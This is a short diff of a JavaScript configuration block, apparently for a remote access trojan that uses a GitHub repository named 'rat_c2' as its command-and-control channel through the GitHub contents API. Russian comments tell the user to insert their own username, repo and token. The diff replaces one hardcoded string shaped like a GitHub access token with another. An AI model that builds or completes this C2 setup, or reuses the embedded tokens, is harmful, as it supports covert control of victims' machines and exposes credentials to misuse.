@@ -2,7 +2,7 @@
 // ⚠️ ВАЖНО: Замени на свои данные!
 const GITHUB_USERNAME = "gitnikaaaa";      // ТВОЙ ЛОГИН GITHUB
 const GITHUB_REPO = "rat_c2";               // НАЗВАНИЕ РЕПОЗИТОРИЯ
-const GITHUB_TOKEN = "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";      // ТВОЙ ТОКЕН
+const GITHUB_TOKEN = "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";      // ТВОЙ ТОКЕН
 
 const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents`;
 const HEADERS = {
